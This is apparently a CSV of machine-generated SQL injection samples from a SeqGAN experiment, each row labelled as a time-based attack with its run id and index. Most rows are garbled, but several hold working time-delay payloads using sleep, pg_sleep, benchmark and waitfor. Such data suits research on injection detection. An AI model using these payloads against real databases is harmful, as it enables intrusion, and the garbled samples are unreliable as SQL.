label,payload,family,payload_type,method,run_id,sample_index
attack,1l'||  (  select 'o')   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,34
attack, delay  (  select pg_sleep  (  5  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,35
attack,"1'||  (  select 'k),waitfor and    _______T6969_TIM  5466  benchmark  0x6d457153   benchmark  7629   waitfor",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,36
attack, or benchmark  (  5   )    )   )    a,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,37
attack,1' and  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,38
attack,1'||  (  select 'crendtqMe  'isintegratedsecurityonly'6866,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,39
attack,%'||  (  select '   p3824zvqf' 4240 '0:0:__TIME__'from,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,40
attack,bs4czicrst25io)or sleep  T#,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,41
attack, pg_sleep  (  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,42
attack,"1'||  (  select 'syi'   )    )    rlike sleep  (  5  )   and    (    (   'vy5MD5  3114,md@5  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,43
attack,1   )    waitfor 3824  (  select t 8514  (   benchmark    (  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,44
attack,)   <> e  (  (  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,45
attack,"""   >waitfordisltairoiet_i:5  if,me  md25,waitfora""   )    )    or sleep  (  __TIME__  )    =  ""vrod5  (  5   a a",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,46
attack,"1f   y  (   ac6456hetE_____  5   5873 *  (  select ,m 4240h""  =  ""   )    or y  (  benchmark  sleep  9443_TIME_TIMME___T( sleep  (  0x6d457153   )    #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,47
attack,1%'   )    )    rlike sleep  (  5  )   and    (    (   '  )    and .8036errr0=   (    3114    )    or sleep  (  TE___  __TIME_________TIM(  sleep  5   (--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,48
attack,"1%'||  (  select 'q-7260$)  and pg_sleep  (  3114,--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,49
attack,'256456 ieelv where or '0:0:10'pg_sleep  (  (   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,50
attack, end  (  )    or--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,51
attack,   )     )   or 8036  sleep  9443  sleep  ((    ())   and--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,52
attack,",1""   where rsbe',5  sleep  m  (_TIME___T=_TIME____T0x6d457153____  5Md5  _____TIMsleep#",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,53
attack,"1'   )   waitfor not  (  _   (  (  5000000  ,benchmark  (  0x6d457153mor sleep  (  5  )   )         )    waitfor delay pg_sleep  (   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,54
attack,,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,55
attack,25sleep  (  select delay 4240  * 6793b pg_sleep  (   sleep    10000000  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,56
attack,";""  =  ""'||  (  select '""  =  ""%%;iaasvbrmsebrsitu___T7629,'||  (  select 'ka:'or",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,57
attack,"1%%'||  (  select 'G'  =  ':'  =  '"" or sleep  (  __TIME__  )    =  ""sp5t______TIME__TEsd25,1  ,(  selecta",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,58
attack,"1'   )    and,d5  substring   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,59
attack,";    case if'||  (  select 'siars0sbas""  =  ""er'  =  'q '0:0:2' '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,60
attack,waitforor from   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,61
attack,"1'||  (  select '""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""#'    (  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,62
attack, --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,63
attack,where3885at,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,64
attack,1'||  (  select 'eoDortel5  (   'sysadmin'   )    <>duh    =   0x6d457153' waitfor delay '--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,65
attack,"1',or 4240 ( *  (  select  (  5,n  (  )   ----",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,66
attack,,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,67
attack,"z%q@itE' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'case' waitfor delay '76293824asiatct:efrom pg_sleep  (  ____________TIME_  0x6d457153   sleep  5,moprepeo--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,68
attack,"""  )     )       ,waitfor ory d5  (___ benchmark  TIME___TIME____T --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,69
attack,"1   )   or',6784  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,70
attack,1 6793rioioif where waitfor,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,71
attack,a  or delay '0:0:__TIME__'from sleep  5   or,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,72
attack,",Ybcid5  (  select pg_sleep  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,73
attack,"1%%'   (   =    )    >so1361bt  )   (  select sleep   (  I   )    )    ,or sleep  3114  sleep  5   waitforn",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,74
attack,"1'||  (  select 'vnb"" like ""10vf@$5466 '0:0:2'7739 pg_sleep  E_  5   )    waitfor  ifed5  (   select  pg_sleep  (  8514)",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,75
attack, from,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,76
attack,1%@|   (   )    eor k  =  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,77
attack,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""r""; 2657  (  3114",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,78
attack,sleep    (  _TIME_____TIMD5  (  5  )   orselt  (  substring   thenl 4240 '0:0:__TIME__'6793 where '0:0:__TIME__' 2388    =  select *r__E_T'   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,79
attack,"3   )T<>lrd$hpvsvc25d0^'   )    )    rlike sleep  (  5  )   and    (    (   ',np1l(   _ case or 7739 not  (   0x76555642--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,80
attack,1'||  (  select '=1'  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,81
attack,;aiaoret'   )   or pg_sleep  (   (  benchmark  (  5   )    ----,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,82
attack,1'||  (  select '50%%tf'or 3885 sleep  (  (  5  and  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,83
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""e4240'  =  '",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,84
attack,'   )    aor--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,85
attack,"1   )   or5702 '0:0:2' sleep  5  5   _<> e""  =  ""s"" like ""%5omdoxwerterer and pg_sleep  4287  (   (select not  (,ta   from--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,86
attack,"1 information_schemabee t if delay 6969y  ( '0:0:2'   (  select pg_sleep  (__  5000000,sleep  substring__d5   )    )   or '0:0:10'@sleep  (  5   )    or pg_sleep   4287  ,M(  3114(   (    (   )    ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,87
attack,"85873>f 4240 sleepsc5  select 9443l sleep  (,(  )    or from",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,88
attack,"1 ""   select 3885d5   (  #--;",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,89
attack,1   =  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,90
attack,zbopg_sleep  then ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,91
attack,"1 | 2840 9443t____  10000000(_______TIMV_TIMdE__  3114,--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,92
attack,"g""  '",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,93
attack,1%%%%8R0   'enpn'sltet05   or   (  9443E_  sleep  _  5   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,94
attack,25waitfor --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,95
attack,1',time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,96
attack,"1%""   	    or   )    select  (    l6793  5    5  sleep  10000000,sleep   (    ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,97
attack,"""   )--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,98
attack,'     --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,99
attack,"1%""   )    not  waitfor   )    or pg_sleep)   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,100
attack,"1""   8781  )    or",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,101
attack,"1'   end, where --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,102
attack,"1%""   )    )    oreno9443ri)  (  )   or from",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,103
attack,"5""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""oMrlikelperty delay hor",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,104
attack,,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,105
attack,"1%""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  "" 0y%""   )    )   or pg_sleep_TIME___TIM50u_____)#",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,106
attack,"1     )   'enpn'waitfor  sleep   (  ,sleep  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,107
attack,1' a0ylertct'enpn'nrsserrctrysiv--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,108
attack,1   3114(    )    or if 94432388e sleep  (  (  ;  ----,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,109
attack,dsleep  (  (   <>_T#,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,110
attack,"as'||  (  select 'dabep0meperariosselectyror5  3  (  (  ,md5 sleep  (  (  5   5'   )    a   waitfors  8781 waitfor s ' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'  (  __TIMD'0:0:10' from 2388  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,111
attack,  )  )    or --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,112
attack,sleep  benchmark____T0x544d5a4c   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,113
attack,"""   )    af' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'   userkt:sy",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,114
attack,"""   case er    =  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,115
attack,"aos6456osvibeeriketa"""" d5  (  select lt,sleep  (   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,116
attack,""" waitfor * or from",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,117
attack,1'   )    aor,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,118
attack,k)    a,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,119
attack,"1'||  (  select '%0""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""t'0:0:10'sleep____TIME_____T6456________TME____  5,   )    or '0:0:2' --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,120
attack,"1'||  (  select ':""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""nrbi0ny  (  ;,son  (  5000000,      (  I      --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,121
attack,"""   25 sleep  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,122
attack," w""  =  ""lwhen  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,123
attack,1   (  )    #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,124
attack,"1'||  (  select '$if f waitfor 4287 waitfor benchmark  select delay pg_sleep  (  5   )   ai',ve5  emcytr  (     )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,125
attack,'   )    )    rlike sleep  (  5  )   and    (    (   'snrb'sa'inr  	  <>semno    _  =  )     m 1   when   and@@  (  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,126
attack,"1   )    orl3824%5  ,,si5  (  100000005873mbnseepipetd5  3114,mr  (  5   )    )  or 1  benchmark u   benchmark  5   (T=,8514   'enpn'ge delay",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,127
attack,1'||  (  select ',time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,128
attack,1',time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,129
attack,"1,1""   )    )   0or '  (  select  5MD5  (  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,130
attack,1%'   )    or delay from,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,131
attack,;waitforlt asrier5  (  5873_TIME___TIME___T__  5  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,132
attack,"1select""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "" like!y",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,133
attack,"rs5  benchmark  0x6d457153   )    )    or 2388  sleep  (  5  )   or pg_sleep  (  5   )    )   )    or pg_sleep  (  5   from   )   and  (  g not  sleep  (  =  (  5   waitfor '0:0:__TIME__' delay  (  6272,sleep  (  sleep  (   =  g,lvy  (   )  select   )     e or benchmark  0x544d5a4c   select",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,134
attack,"1%'||  (  select '<>"" or sleep  (  __TIME__  )    =  ""5ri where andallrt  (  3114  sleep  4287,(  @  '0:0:2' from   )    select k benchmark  (  (   select --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,135
attack,%aW g--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,136
attack,"""   <>ye    9862  3114  # sleep  (  (r@  (  )   from   (   select and    (  6866",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,137
attack,;waitfor  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,138
attack,"""   )    )    or sleep  (  __TIME__  )    =  ""   )   select xiyrt  )  ),--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,139
attack,18036   )    shkii<>    1siiscepvr0operst  7739)   or,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,140
attack,1' <>yso5  (  sleep  5  (   )    )    or sleep  (  5   )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,141
attack,1%'   selector from,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,142
attack,"1'||  (  select 's0\where'||  (  select '""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""psioerpcderrpor",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,143
